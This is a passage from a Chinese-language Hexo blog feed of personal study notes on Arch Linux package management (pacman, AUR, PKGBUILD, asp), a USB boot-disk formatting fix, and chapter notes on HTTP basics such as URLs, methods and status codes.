title="和 -Q 相关"></a>和 <code>-Q</code> 相关</h2><p><code>sudo pacman -Q | wc -l</code> 可以查看你已经安装了有多少个软件.</p><p><code>sudo pacman -Qe</code> 可以查看你自己安装的软件, 除去系统安装的.</p><p><code>sudo pacman -Qeq</code> 不会显示版本号.</p><p><code>sudo pacman -Qs +软件名</code> </p><p><code>sudo pacman -Qdt</code>, 这里 <code>dt</code> 是 dependencies, 显示不再被需要的依赖.</p><p>删除这些 <code>sudo pacman -R $(sudo pacman -Qdt)</code></p><h1 id="error-GPGME-error-No-data-解决"><a href="#error-GPGME-error-No-data-解决" class="headerlink" title="error: GPGME error: No data 解决"></a>error: GPGME error: No data 解决</h1><p><a href="https://www.fujieace.com/blackarch-linux/gpgme.html">参考</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo rm -rf <span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/pacman/</span>sync<br>$ sudo pacman -Syu<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 AUR 部分</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD-AUR-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD-AUR-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Arch_User_Repository_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)">ArchLinux</a></p><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>AUR (Arch User Repository), 其软件包以 <code>PKGBUILD</code> 的形式提供，用户自己通过 <code>makepkg</code> 生成包，再由 <code>pacman</code> 安装。</p><p>创建 AUR 的初衷是方便用户维护和分享新软件包.</p><p>可通过 SSH 连接到 AUR: 运行 <code>ssh aur@aur.archlinux.org help</code> 可获得可用指令列表。</p><p>AUR 维护人员现在仍被称为受信用户 (TU).</p><p>Git 仓库成为 PKGBUILD 的发布方式.</p><p>Github 上的 AUR Archive 储存了迁移过程中的所有 AUR3 软件包仓库。<br><a href="https://github.com/aur-archive">AUR Archive</a></p><h1 id="安装与更新软件包"><a href="#安装与更新软件包" class="headerlink" title="安装与更新软件包"></a>安装与更新软件包</h1><p>基本步骤:</p><ol><li>从 AUR 下载包含 PKGBUILD 和其他安装文件的 tar 包</li><li>用 <code>tar -xvf packagename.tar.gz</code> 解包到一个仅用于编译 AUR 的空闲文件夹</li><li>验证 PKGBUILD 和其他相关文件，确保其中不含有恶意代码</li><li>在保存文件的目录下运行 <code>makepkg</code>, 这将下载代码，编译并打包</li><li>运行 <code>pacman -U package_file</code> 将软件包安装到系统上</li></ol><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>需安装 <code>base-devel</code> 软件包组，其包含了 <code>make</code> 和其他编译工具。</p><h1 id="获取软件包构建所需的文件"><a href="#获取软件包构建所需的文件" class="headerlink" title="获取软件包构建所需的文件"></a>获取软件包构建所需的文件</h1><p>使用 git:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span></span><br></code></pre></td></tr></table></figure><p>使用 curl:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ curl -L -O https:<span class="hljs-regexp">//</span>aur.archlinux.org<span class="hljs-regexp">/cgit/</span>aur.git<span class="hljs-regexp">/snapshot/</span>package_name.tar.gz<br></code></pre></td></tr></table></figure><p>不用 root 用户运行 <code>makepkg</code> 能够在一定程度上防止恶意代码损坏系统。</p><p>可以使用 <code>git clean -dfX</code> 删除所有被 git 忽略的文件，从而删除所有以前构建的包文件。</p><p><code>makepkg</code> 常用参数:</p><ul><li><code>-s/--syncdeps</code> 在构建之前使用 pacman 自动解析和安装任何依赖项。如果包依赖于其他 AUR 包，则您应先手动安装它们。</li><li><code>-i/--install</code> 安装成功的包。这使您可以跳过通常手动完成的下一步。</li><li><code>-r/--rmdeps</code> 在构建后删除构建时依赖项，因为它们不再需要。但是，下次更新包时可能需要重新安装这些依赖项。</li><li><code>-c/--clean</code> 在构建后清理临时构建文件，因为它们不再需要。这些文件通常仅在调试构建过程时才需要。</li></ul><h1 id="安装包"><a href="#安装包" class="headerlink" title="安装包"></a>安装包</h1><p>使用 <code>pacman</code>:</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-meta"># pacman -U package_name-version-architecture.pkg.tar.zst</span><br></code></pre></td></tr></table></figure><h1 id="升级包"><a href="#升级包" class="headerlink" title="升级包"></a>升级包</h1><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>git pull<br></code></pre></td></tr></table></figure><h1 id="调试包构建过程"><a href="#调试包构建过程" class="headerlink" title="调试包构建过程"></a>调试包构建过程</h1><ol><li>在构建之前，确保环境最新</li><li>确保安装 <code>base-devle</code></li><li>使用 <code>-s</code> 选项和 <code>makepkg</code> 配置</li></ol>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决用 U 盘作为启动盘时没找到 Linux 的安装选项</title>
    <link href="/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-U-%E7%9B%98%E4%BD%9C%E4%B8%BA%E5%90%AF%E5%8A%A8%E7%9B%98%E6%97%B6%E6%B2%A1%E6%89%BE%E5%88%B0-Linux-%E7%9A%84%E5%AE%89%E8%A3%85%E9%80%89%E9%A1%B9/"/>
    <url>/2022/08/30/%E8%A7%A3%E5%86%B3%E7%94%A8-U-%E7%9B%98%E4%BD%9C%E4%B8%BA%E5%90%AF%E5%8A%A8%E7%9B%98%E6%97%B6%E6%B2%A1%E6%89%BE%E5%88%B0-Linux-%E7%9A%84%E5%AE%89%E8%A3%85%E9%80%89%E9%A1%B9/</url>
    
    <content type="html"><![CDATA[<p>grub 不支持用 ntfs 格式的启动盘，需要将其改为 ext4&#x2F;fat32, 这里使用 fat32 格式即可:</p><p>先用 <code>fdisk</code> 查找设备:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>sudo fdisk -l<br></code></pre></td></tr></table></figure><p>然后修改格式, 假设设备为 <code>/dev/sda1</code>:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ sudo mkfs.vfat <span class="hljs-regexp">/dev/</span>sda1<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Errors</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决在 hexo 博客中无法显示图片问题</title>
    <link href="/2022/08/30/%E8%A7%A3%E5%86%B3%E5%9C%A8-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/"/>
    <url>/2022/08/30/%E8%A7%A3%E5%86%B3%E5%9C%A8-hexo-%E5%8D%9A%E5%AE%A2%E4%B8%AD%E6%97%A0%E6%B3%95%E6%98%BE%E7%A4%BA%E5%9B%BE%E7%89%87%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p>将图片放入 <code>source/img</code> 文件中可在博客中正常显示。</p><p>将图片放入与博文同名的文件夹中可以在 <code>instant-markdown-d</code> 中正确显示.</p>]]></content>
    
    
    <categories>
      
      <category>Hexo</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 PKGBUILD 部分</title>
    <link href="/2022/08/30/ArchWiki-%E4%B8%AD-PKGBUILD-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/ArchWiki-%E4%B8%AD-PKGBUILD-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/PKGBUILD">文章位置</a><br>A <code>PKGBUILD</code> is a shell script (也就是说是一个 shell 脚本文件，应该和 Makefile 类似) containing the build information required by Arch Linux packages.</p><p>Arch Linux 用 <code>makepkg</code> 创建软件包。</p><p>当 <code>makepkg</code> 运行时，它会在当前目录寻找 <code>PKGBUILD</code> 文件，并依照其中的指令编译或获取所需的依赖文件，并生成 <code>pkgname.pkg.tar.xz</code> 软件包。生成的包内有二进制文件和安装指令，可以使用 <code>pacman</code> 进行安装。</p><p>可使用 <code>namcap</code> 来检查 <code>PKGBUILD</code> 文件中的常见打包错误。</p><p><code>pkgname</code>, <code>pkgver</code>, <code>pkgrel</code> 和 <code>arch</code> 是 <code>PKGBUILD</code> 文件必须包含的变量。</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>asp 工具相关</title>
    <link href="/2022/08/30/asp-%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/"/>
    <url>/2022/08/30/asp-%E5%B7%A5%E5%85%B7%E7%9B%B8%E5%85%B3/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/archlinux/asp">主页</a><br><code>asp</code> is a tool to manage the build source files used to create Arch Linux packages. </p><p><code>asp</code> 替代了 <code>abs</code>, 其提供了更多的 date sources, 使用一个 sparse checkout model 来维护 diskspace.</p><h1 id="使用-asp"><a href="#使用-asp" class="headerlink" title="使用 asp"></a>使用 asp</h1><p>To clone the svntogit-repository for a specific package, use:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>asp checkout pkgname<br></code></pre></td></tr></table></figure><p>这会把一个 git repository for the given package 克隆到一个目录 named like the package.</p><p>去更新这个 git repository, 可以 <code>asp update</code> followed by <code>git pull</code> inside the git repository.</p><p>如果要 copy 一个快照 of the current PKGBUILD for 一个特指的 package, use:</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elm">$ asp ex<span class="hljs-keyword">port</span> pkgname<br></code></pre></td></tr></table></figure><h1 id="直接使用-git"><a href="#直接使用-git" class="headerlink" title="直接使用 git"></a>直接使用 git</h1><p>clone 一个特指的 branch:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">git <span class="hljs-built_in">clone</span> --branch branch/package --single-branch https://github.com/archlinux/svntogit-packages.git</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>阅读 ArchWiki 中 Arch Linux 部分</title>
    <link href="/2022/08/30/%E9%98%85%E8%AF%BB-ArchWiki-%E4%B8%AD-Arch-Linux-%E9%83%A8%E5%88%86/"/>
    <url>/2022/08/30/%E9%98%85%E8%AF%BB-ArchWiki-%E4%B8%AD-Arch-Linux-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/">ArchWiki</a><br>Arch Linux 更为简洁，一开始的内容很少，几乎所有配置都需要自己添加。</p><p>其基于滚动发行 (rolling-releasel).</p><p>一开始只有 commandline 界面。</p><p>arch 的包管理器为 pacman.</p><h1 id="About-Arch-Build-System"><a href="#About-Arch-Build-System" class="headerlink" title="About Arch Build System"></a>About Arch Build System</h1><p>The Arch build system is a port-like system for building and packaging software from source code.</p><p><mark>pacman</mark> is the specialized Arch tool for binary package management.</p><p><mark>ABS</mark>(Arch Build System) is a collection of tools for compiling source into installable <code>.pkg.tar.zst</code> packages.</p><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p><code>ABS</code> 包含以下工具作为 a complete toolkit:</p><ul><li>Repository tree, 是 repository 的文件结构</li><li>PKGBUILD, 是一个 bash script</li><li>makepkg, a shell command tool which reads PKGBUILDs, automatically downloads and compiles the sources and creates a <code>.pkg.tar*</code> according to the <code>PKGEXT</code> array in <code>makepkg.conf</code></li><li>pacman, to install and remove the build packages and for fetching dependencies.</li><li>AUR (The Arch User Repository)</li></ul><h2 id="Repository-tree"><a href="#Repository-tree" class="headerlink" title="Repository tree"></a>Repository tree</h2><p>一个包，假如为 <code>acl</code>, 其 tree 大概为:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">acl <br>acl/repos<br>acl<span class="hljs-regexp">/repos/</span>core-x86_64<br>acl<span class="hljs-regexp">/repos/</span>core-x86_64/PKGBUILD<br>acl/trunk<br>acl<span class="hljs-regexp">/trunk/</span>PKGBUILD<br>acl<br></code></pre></td></tr></table></figure><p><code>repos</code> 目录中为官方发布的，<code>truck</code> 目录是还没有发布到 <code>repos</code> 中的。</p><p>真正的源码不会存在于 ABS directory 中, <code>PKGBUILD</code> 里面包含了一个 URL, that will download the source code when the package is built.</p><h3 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h3><h4 id="Retrieve-PKGBUILD-source"><a href="#Retrieve-PKGBUILD-source" class="headerlink" title="Retrieve PKGBUILD source"></a>Retrieve PKGBUILD source</h4><p>为了得到 PKGBUILD file 需要构建一个具体的 package from source, 可以使用 <code>SVN</code> 或者 <code>GIT</code>.</p><p>先决条件是 install the <code>asp</code> package.</p><p>Asp 是一个工具，用于使用 GIT 来获取 the build source file for Arch Linux packages.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Python 之禅</title>
    <link href="/2022/08/29/Python-%E4%B9%8B%E7%A6%85/"/>
    <url>/2022/08/29/Python-%E4%B9%8B%E7%A6%85/</url>
    
    <content type="html"><![CDATA[<p>在交互界面中输入 <code>import this</code> 可以看到.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>HTTP 权威指南 Notes</title>
    <link href="/2022/08/29/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/"/>
    <url>/2022/08/29/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/</url>
    
    <content type="html"><![CDATA[<p><a href="http://www.joes-hardware.com/">Joe的五金商店</a></p><h1 id="第一部分-HTTP-Web-的基础"><a href="#第一部分-HTTP-Web-的基础" class="headerlink" title="第一部分 HTTP: Web 的基础"></a>第一部分 HTTP: Web 的基础</h1><h2 id="第一章-HTTP-概述"><a href="#第一章-HTTP-概述" class="headerlink" title="第一章 HTTP 概述"></a>第一章 HTTP 概述</h2><h3 id="1-1-HTTP-–-因特网的多媒体信使"><a href="#1-1-HTTP-–-因特网的多媒体信使" class="headerlink" title="1.1 HTTP – 因特网的多媒体信使"></a>1.1 HTTP – 因特网的多媒体信使</h3><p>HTTP (Hypertext Transfer  Protocol, 超文本传输协议).</p><h3 id="1-2-Web-客户端和服务器"><a href="#1-2-Web-客户端和服务器" class="headerlink" title="1.2 Web 客户端和服务器"></a>1.2 Web 客户端和服务器</h3><p>HTTP 客户端和 HTTP 服务器共同构成了万维网的基本组件。</p><h3 id="1-3-资源"><a href="#1-3-资源" class="headerlink" title="1.3 资源"></a>1.3 资源</h3><p>Web resource 在 Web server 中。</p><h4 id="1-3-1-媒体类型"><a href="#1-3-1-媒体类型" class="headerlink" title="1.3.1 媒体类型"></a>1.3.1 媒体类型</h4><p>MIME (Multipurpose Internet Mail Extension, 多用途因特网邮件扩展) 类型用来描述并标记多媒体内容.</p><p>Web 服务器会为所有 HTTP 对象数据附加一个 MIME 类型。</p><p>MIME 类型是一种文本标记，表示一种主要的对象类型和一个特定的子类型，中间由一条斜杠分隔，如:</p><ul><li>HTML 格式的文本文档由 text&#x2F;html 类型来标记<br>由此可见，MIME 类型不是特指一种类型.</li></ul><h4 id="1-3-2-URI"><a href="#1-3-2-URI" class="headerlink" title="1.3.2 URI"></a>1.3.2 URI</h4><p>URI (Uniform Resource Identifier, 统一资源标识符). 唯一标识并定位信息资源.</p><p>URI 有两种形式:</p><ul><li>URL</li><li>URN</li></ul><h4 id="1-3-3-URL"><a href="#1-3-3-URL" class="headerlink" title="1.3.3 URL"></a>1.3.3 URL</h4><p>URL (Uniform Resource Locator), 描述一台特定服务器上某资源的特定位置.</p><p>URL 大都遵循一种标准格式，其包含三个部分:</p><ol><li>方案 (scheme), 即协议类型, 如: <code>http://</code></li><li>服务器的因特网地址，如: <code>www.joes-hardware.com</code></li><li>其余部分指定 Web 服务器上的某个资源，如: <code>/specials/saw-blade.gif</code></li></ol><h4 id="1-3-4-URN"><a href="#1-3-4-URN" class="headerlink" title="1.3.4 URN"></a>1.3.4 URN</h4><p>URN (Uniform Resource Name), 与目前的资源所在地无关，其作为特定内容的唯一名称使用。如: <code>urn:ietf:rfc:2141</code></p><p>这种框架可以在对象从一处搬移到另一处时，保持稳定的访问名称。</p><h3 id="1-4-事务"><a href="#1-4-事务" class="headerlink" title="1.4 事务"></a>1.4 事务</h3><p>一个 HTTP 事务由一条请求命令和一个响应结果组成，这种通信是通过名为 HTTP 报文 (HTTP message) 的格式化数据块进行的。</p><h4 id="1-4-1-方法"><a href="#1-4-1-方法" class="headerlink" title="1.4.1 方法"></a>1.4.1 方法</h4><p>HTTP 支出几种不同的请求命令，这些命令被称为 HTTP 方法 (HTTP method). 每条 HTTP 请求报文都包含一个方法，这个方法会告诉服务器要执行什么动作。</p><p>5种常见的 HTTP 方法:</p><ul><li>GET, 从服务器向客户端发送命名资源</li><li>PUT，将来自客户端的数据存储到一个命名的服务器资源中</li><li>DELETE, 从服务器删除命名资源</li><li>POST, 将客户端数据发送到一个服务器网关应用程序</li><li>HEAD, 仅发送命名资源响应中的 HTTP 首部</li></ul><h4 id="1-4-2-状态码"><a href="#1-4-2-状态码" class="headerlink" title="1.4.2 状态码"></a>1.4.2 状态码</h4><p>每条 HTTP 响应报文返回时都会携带一个状态码，状态码是一个三位数字的代码。</p><p>几种常见的状态码:</p><ul><li>200, OK, 文档正确返回</li><li>302，Redirect, 到其他地方获取资源</li><li>404, Not Found, 无法找到资源</li></ul><h4 id="1-4-3-Web-页面中可以包含多个对象"><a href="#1-4-3-Web-页面中可以包含多个对象" class="headerlink" title="1.4.3 Web 页面中可以包含多个对象"></a>1.4.3 Web 页面中可以包含多个对象</h4><h3 id="1-5-报文"><a href="#1-5-报文" class="headerlink" title="1.5 报文"></a>1.5 报文</h3><p>从 Web 客户端发往 Web 服务器的 HTTP 报文称为请求报文 (request message), 从服务器发往客户端的报文称为响应报文 (response message).</p><p>其包含三个部分:</p><ul><li>起始行</li><li>首部字段, 每个首部字段都包含一个名字和一个值，其用 <code>:</code> 分隔</li><li>主体, 可包含二进制数据</li></ul><h3 id="1-6-连接"><a href="#1-6-连接" class="headerlink" title="1.6 连接"></a>1.6 连接</h3><h4 id="1-6-1-TCP-x2F-IP"><a href="#1-6-1-TCP-x2F-IP" class="headerlink" title="1.6.1 TCP&#x2F;IP"></a>1.6.1 TCP&#x2F;IP</h4><p>HTTP 协议位于 TCP 的上层，HTTP 使用 TCP 来传输其报文数据. TCP 位于 IP 上层。<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/%E5%88%86%E5%B1%82.png" alt="分层"></p><h4 id="1-6-2-连接、IP-地址及端口号"><a href="#1-6-2-连接、IP-地址及端口号" class="headerlink" title="1.6.2 连接、IP 地址及端口号"></a>1.6.2 连接、IP 地址及端口号</h4><p>在 HTTP 客户端向服务器发送报文之前，需要用网际协议 (Internet Protocol, IP) 地址和端口号在客户端和服务器之间建立一条 TCP&#x2F;IP 连接。</p><p>URL 中没有端口号，可以假设其有默认端口号。</p><h4 id="1-6-3-一个使用-Telnet-的实例"><a href="#1-6-3-一个使用-Telnet-的实例" class="headerlink" title="1.6.3 一个使用 Telnet 的实例"></a>1.6.3 一个使用 Telnet 的实例</h4><p>Telnet 程序可以将键盘连接到某个目标 TCP 端口，并将此 TCP 端口的输出回送到显示屏上.</p><p>Telent 常用于远程终端会话，其几乎可以连接所有的 TCP 服务器。</p><p>使用 <code>telnet</code> 程序:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ telnet www<span class="hljs-selector-class">.baidu</span><span class="hljs-selector-class">.com</span> <span class="hljs-number">80</span><br></code></pre></td></tr></table></figure><p>其会输出三行内容表示已经建立好了连接，此时我们可以输入请求命令如:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>/tools.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>nc 程序可以方便地操纵基于 UDP 和 TCP 的流量.</p><h3 id="1-7-协议版本"><a href="#1-7-协议版本" class="headerlink" title="1.7 协议版本"></a>1.7 协议版本</h3><p>目前仍使用的版本:</p><ul><li>HTTP&#x2F;0.9</li><li>HTTP&#x2F;1.0</li><li>HTTP&#x2F;1.0+</li><li>HTTP&#x2F;1.1</li><li>HTTP&#x2F;2.0</li></ul><h3 id="1-8-Web-的结构组件"><a href="#1-8-Web-的结构组件" class="headerlink" title="1.8 Web 的结构组件"></a>1.8 Web 的结构组件</h3><p>较为重要的应用程序:</p><ul><li>代理, 位于客户端和服务器之间的 HTTP 中间实体</li><li>缓存, HTTP 仓库，使常用页面的副本可以保存在离客户端更近的地方</li><li>网关, 连接其他应用程序的特殊的 Web 服务器</li><li>隧道, 对 HTTP 通信报文进行盲转发的特殊代理</li><li>Agent 代理, 发起自动 HTTP 请求的半智能 Web 客户端</li></ul><h4 id="1-8-1-代理"><a href="#1-8-1-代理" class="headerlink" title="1.8.1 代理"></a>1.8.1 代理</h4><p>代理还可以对请求和响应进行过滤。</p><h4 id="1-8-2-缓存"><a href="#1-8-2-缓存" class="headerlink" title="1.8.2 缓存"></a>1.8.2 缓存</h4><p>客户端从附近缓存下载文档会比从远程 Web 服务器下载快得多.</p><h4 id="1-8-3-网关"><a href="#1-8-3-网关" class="headerlink" title="1.8.3 网关"></a>1.8.3 网关</h4><p>gateway, 作为其他服务器的中间实体使用。通常用于将 HTTP 流量转换成其他的协议.</p><h4 id="1-8-4-隧道"><a href="#1-8-4-隧道" class="headerlink" title="1.8.4 隧道"></a>1.8.4 隧道</h4><p>HTTP 隧道的一种常见用途是通过 HTTP 连接承载加密的安全套接字层 (SSL, Secure Socket Layer) 流量，使其可以穿过只允许 Web 流量通过的防火墙。</p><h4 id="1-8-5-Agent-代理"><a href="#1-8-5-Agent-代理" class="headerlink" title="1.8.5 Agent 代理"></a>1.8.5 Agent 代理</h4><p>是代表客户发起 HTTP 请求的客户端程序。</p><p>所有发布 Web 请求的应用程序都是 HTTP Agent 代理.</p><h2 id="第二章-URL-与资源"><a href="#第二章-URL-与资源" class="headerlink" title="第二章 URL 与资源"></a>第二章 URL 与资源</h2><h3 id="2-1-浏览因特网资源"><a href="#2-1-浏览因特网资源" class="headerlink" title="2.1 浏览因特网资源"></a>2.1 浏览因特网资源</h3><p>URL 为应用程序提供了一种访问资源的手段。</p><h3 id="2-2-URL-的语法"><a href="#2-2-URL-的语法" class="headerlink" title="2.2 URL 的语法"></a>2.2 URL 的语法</h3><p>URL 语法会随方案的不同而有所不同.</p><p>大部分 URL 都遵循通用的 URL 语法，而且不同 URL 方案的风格和语法都有不少重叠。</p><p>浏览器通常会用其他应用程序来处理特殊的资源.</p><p>由9部分构成的通用格式:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;scheme&gt;<span class="hljs-symbol">://&lt;user&gt;</span><span class="hljs-symbol">:&lt;password&gt;</span>@&lt;host&gt;<span class="hljs-symbol">:&lt;port&gt;/&lt;path&gt;</span>;&lt;params&gt;<span class="hljs-string">?&lt;</span>query&gt;#&lt;frag&gt;<br></code></pre></td></tr></table></figure><p>解释:<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/URL%E7%BB%84%E4%BB%B6.png" alt="URL组件"><br><img src="/../img/URL%E7%BB%84%E4%BB%B6.png" alt="URL组件"></p><h4 id="2-2-1-方案-–-使用什么协议"><a href="#2-2-1-方案-–-使用什么协议" class="headerlink" title="2.2.1 方案 – 使用什么协议"></a>2.2.1 方案 – 使用什么协议</h4><p>方案，告诉负责解析 URL 的应用程序应该使用什么协议。</p><p>方案名是大小写无关的，<code>https://</code> 和 <code>HTTPS://</code> 等价。</p><h4 id="2-2-2-主机与端口"><a href="#2-2-2-主机与端口" class="headerlink" title="2.2.2 主机与端口"></a>2.2.2 主机与端口</h4><p>主机组件标识了因特网上能够访问资源的宿主机器。如用域名或 IP 地址来表示主机名.</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>www.jows-hardware.com:<span class="hljs-number">80</span>/index.html<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">161.58</span>.<span class="hljs-number">228.45</span>:<span class="hljs-number">80</span>/index.html<br></code></pre></td></tr></table></figure><p>端口组件标识了服务器正在监听的网络端口。</p><h4 id="2-2-3-用户名和密码"><a href="#2-2-3-用户名和密码" class="headerlink" title="2.2.3 用户名和密码"></a>2.2.3 用户名和密码</h4><p>如果某应用程序使用的 URL 方案要求输入用户名和密码，但用户没有提供，它通常会插入一个默认的用户名和密码。</p><h4 id="2-2-4-路径"><a href="#2-2-4-路径" class="headerlink" title="2.2.4 路径"></a>2.2.4 路径</h4><p>URL 的路径组件说明了资源位于服务器的什么地方。</p><p>可以用字符 “&#x2F;“ 将 HTTP URL 的路径组件划分成一些路径段 (path segment), 每个路径段都有自己的参数 (param) 组件。</p><h4 id="2-2-5-参数"><a href="#2-2-5-参数" class="headerlink" title="2.2.5 参数"></a>2.2.5 参数</h4><p>负责解析 URL 的应用程序需要这些协议参数来访问资源。</p><p>FTP 有两种传输模式:</p><ul><li>二进制</li><li>文本形式</li></ul><h4 id="2-2-6-查询字符串"><a href="#2-2-6-查询字符串" class="headerlink" title="2.2.6 查询字符串"></a>2.2.6 查询字符串</h4><p>很多资源，比如数据库服务，都是可以通过提问题或进行查询来缩小所请求资源的类型范围。</p><p>按照常规，很多网关都希望查询字符串以一系列 “名&#x3D;值” 对的形式出现，名值对之间用字符 “&amp;” 分隔:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.joes-hardware.com/inventory-check.cgi?item=<span class="hljs-number">12731</span>&amp;color=blue<br></code></pre></td></tr></table></figure><h4 id="2-2-7-片段"><a href="#2-2-7-片段" class="headerlink" title="2.2.7 片段"></a>2.2.7 片段</h4><p>HTTP 服务器通常只处理整个对象，而不是对象的片段，客户端不能将片段传送给服务器，浏览器从服务器获得了整个资源后，会根据片段来显示你感兴趣的那部分资源。</p><h3 id="2-3-URL-快捷方式"><a href="#2-3-URL-快捷方式" class="headerlink" title="2.3 URL 快捷方式"></a>2.3 URL 快捷方式</h3><h4 id="2-3-1-相对-URL"><a href="#2-3-1-相对-URL" class="headerlink" title="2.3.1 相对 URL"></a>2.3.1 相对 URL</h4><p>URL 有两种方式:</p><ul><li>绝对 URL, 其包含访问资源所需的全部信息</li><li>相对 URL, 需借助基础 (base) URL 进行解析<br><img src="/HTTP-%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-Notes/%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80URL.png" alt="使用基础 URL"><br><img src="/../img/%E4%BD%BF%E7%94%A8%E5%9F%BA%E7%A1%80URL.png" alt="使用基础 URL"></li></ul><h5 id="基础-URL"><a href="#基础-URL" class="headerlink" title="基础 URL"></a>基础 URL</h5><p>转换处理的第一步就是找到基础 URL.</p><p>基础 URL 可以来自:</p><ul><li>在资源中显示提供，如在 HTML 文档中包含一个定义了基础 URL 的 HTML 标记 <code>&lt;BASE&gt;</code>.</li><li>封装资源的基础 URL, 将它所属资源的 URL 作为基础</li><li>没有基础 URL</li></ul><h5 id="解析相对引用"><a href="#解析相对引用" class="headerlink" title="解析相对引用"></a>解析相对引用</h5><p>通常称作分解 (decomposing) URL, 将1基础和相对 URL 划分成组件。</p><h4 id="2-3-2-自动扩展-URL"><a href="#2-3-2-自动扩展-URL" class="headerlink" title="2.3.2 自动扩展 URL"></a>2.3.2 自动扩展 URL</h4><p>用户不需要输入完整的 URL, 因为浏览器会自动扩展。</p><p>以下两种方式:</p><ul><li>主机名扩展</li><li>历史扩展</li></ul><h3 id="2-4-各种令人头疼的字符"><a href="#2-4-各种令人头疼的字符" class="headerlink" title="2.4 各种令人头疼的字符"></a>2.4 各种令人头疼的字符</h3><h4 id="2-4-1-URL-字符集"><a href="#2-4-1-URL-字符集" class="headerlink" title="2.4.1 URL 